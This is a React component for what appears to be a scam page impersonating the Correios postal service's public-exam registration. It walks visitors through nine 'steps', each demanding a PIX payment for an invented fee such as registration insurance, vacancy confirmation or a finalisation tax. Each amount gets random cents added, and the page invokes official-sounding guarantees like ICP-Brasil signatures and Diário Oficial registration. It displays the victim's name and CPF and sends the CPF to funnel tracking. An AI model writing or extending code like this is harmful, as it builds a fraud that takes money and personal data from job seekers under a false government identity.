import { useEffect } from "react";
import { useNavigate, useLocation, useParams } from "react-router-dom";
import { BookOpen, FileText, Shield, MapPin, Zap, Receipt, Award, CheckSquare, Star } from "lucide-react";
import { Button } from "@/components/ui/button";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import { CPFData } from "@/lib/cpf";
import { getSession, saveSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const UPSELL_INFO = [
  { title: "Material para o Dia da Prova", valor: 34, tipo: "material" as const, icon: BookOpen, headline: "MATERIAL PARA O DIA DA PROVA", items: ["Caderno de questões oficial com 60 questões", "Folha de respostas personalizada com seus dados", "Caneta esferográfica preta homologada pela banca", "Bloco de rascunho carimbado pelo fiscal", "Envelope lacrado para documentos pessoais"], nota: "O material será entregue no local da prova no dia do exame." },
  { title: "Taxa de Processamento Digital", valor: 29, tipo: "taxa" as const, icon: FileText, headline: "PROCESSAMENTO DIGITAL DA INSCRIÇÃO", items: ["Validação dos dados no sistema federal", "Geração do número de inscrição definitivo", "Vinculação ao banco de dados da banca IBFC", "Registro no Diário Oficial Eletrônico"], nota: "Processamento realizado em até 24 horas úteis." },
  { title: "Seguro de Inscrição", valor: 34, tipo: "taxa" as const, icon: Shield, headline: "SEGURO PROTEÇÃO DA INSCRIÇÃO", items: ["Reembolso integral em caso de cancelamento", "Cobertura por adiamento superior a 90 dias", "Proteção contra indeferimento por erro do sistema", "Assistência para recurso administrativo"], nota: "Válido até a data de realização da prova." },
  { title: "Taxa de Confirmação de Vaga", valor: 19, tipo: "taxa" as const, icon: MapPin, headline: "CONFIRMAÇÃO E RESERVA DE VAGA", items: ["Reserva de vaga na data selecionada", "Alocação no local de prova mais próximo", "Garantia de sala com acessibilidade", "Confirmação por e-mail e SMS"], nota: "O local será informado 15 dias antes da prova." },
  { title: "Kit Preparatório Express", valor: 42, tipo: "taxa" as const, icon: Zap, headline: "KIT DE REVISÃO DE ÚLTIMA HORA", items: ["Resumos de todas as matérias do edital", "Mapas mentais com tópicos mais cobrados", "50 questões comentadas de provas anteriores", "Dicas exclusivas de aprovados"], nota: "Acesso digital imediato após confirmação." },
  { title: "Taxa de Emissão de Comprovante", valor: 15, tipo: "taxa" as const, icon: Receipt, headline: "EMISSÃO DO COMPROVANTE OFICIAL", items: ["Comprovante com código de autenticação único", "QR Code para validação no dia da prova", "Versão digital e impressa disponíveis", "Aceito como documento oficial do concurso"], nota: "Comprovante disponível em até 2 horas." },
  { title: "Certificado de Inscrição Digital", valor: 22, tipo: "taxa" as const, icon: Award, headline: "CERTIFICADO DIGITAL DE INSCRIÇÃO", items: ["Assinatura eletrônica ICP-Brasil", "Válido como documento oficial", "Pode ser usado para abono de falta no trabalho", "Registro permanente no sistema dos Correios"], nota: "Certificado gerado com validade jurídica." },
  { title: "Taxa de Finalização", valor: 12, tipo: "taxa" as const, icon: CheckSquare, headline: "FINALIZAÇÃO DO PROCESSO DE INSCRIÇÃO", items: ["Homologação definitiva da inscrição", "Encerramento do protocolo de inscrição", "Geração do cartão de confirmação", "Inclusão na lista oficial de inscritos"], nota: "Após o pagamento, sua inscrição será homologada." },
  { title: "Garantia de Vaga Prioritária", valor: 89, tipo: "taxa" as const, icon: Star, headline: "PRIORIDADE NA ALOCAÇÃO DE VAGA", items: ["Prioridade na escolha da agência de lotação", "Preferência na alocação geográfica", "Garantia de vaga na região selecionada", "Acompanhamento prioritário do processo"], nota: "Sujeito à disponibilidade de vagas na região." },
];

const UpsellInfo = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { step } = useParams<{ step: string }>();

  const parsedStep = parseInt(step || "1", 10);
  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 9);
  const currentIndex = stepNumber - 1;
  const info = UPSELL_INFO[currentIndex];

  const valorComCentavos = info.valor + (Math.floor(Math.random() * 99) + 1) / 100;

  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;

  useEffect(() => { window.scrollTo(0, 0); }, [stepNumber]);

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: `/upsell-info/${stepNumber}`, valorBeneficio, protocolo });
    trackFunnelEvent(`upsell-info-${stepNumber}`, { cpf: cpfData.cpf });
  }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);

  const handlePagar = () => {
    navigate(buildUrlWithUtm(`/upsell/${stepNumber}`), { state: { cpfData, valorBeneficio, protocolo } });
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb={`Concursos > Inscrição > Etapa ${stepNumber}/9`} />

      <main className="flex-1 px-4 py-6 sm:py-8">
        <div className="max-w-lg mx-auto space-y-5">

          <h1 className="titulo-institucional text-lg">{info.headline}</h1>
          <p className="text-sm text-muted-foreground">Etapa {stepNumber} de 9 do processo de inscrição.</p>

          {/* Items table */}
          <table className="tabela-zebra">
            <thead>
              <tr><th>{info.tipo === "material" ? "Itens Inclusos" : "O que está coberto"}</th></tr>
            </thead>
            <tbody>
              {info.items.map((item, i) => (
                <tr key={i}><td>{item}</td></tr>
              ))}
            </tbody>
          </table>

          {/* Candidato */}
          <table className="tabela-zebra">
            <thead><tr><th colSpan={2}>Dados do Candidato</th></tr></thead>
            <tbody>
              <tr><td className="font-semibold w-1/3">Candidato</td><td>{cpfData.nome}</td></tr>
              <tr><td className="font-semibold">CPF</td><td>{cpfData.cpf}</td></tr>
            </tbody>
          </table>

          {/* Observação */}
          <div className="text-xs text-muted-foreground space-y-1">
            <p className="font-semibold text-foreground">Observações:</p>
            <p>• {info.nota}</p>
            <p>• Pagamento via PIX com confirmação instantânea.</p>
          </div>

          {/* Valor */}
          <div className="rounded border-2 border-accent bg-accent/10 p-4 text-center space-y-1">
            <p className="text-sm font-semibold text-foreground">
              {info.tipo === "material" ? "Valor do Material" : "Valor da Taxa"}
            </p>
            <p className="text-3xl font-black text-primary">
              R$ {valorComCentavos.toFixed(2).replace('.', ',')}
            </p>
          </div>

          <Button onClick={handlePagar} className="w-full h-12 text-sm font-bold">
            PAGAR AGORA
          </Button>

          <p className="text-[10px] text-center text-muted-foreground">
            Etapa {stepNumber} de 9 — Pagamento seguro via PIX
          </p>
        </div>
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default UpsellInfo;
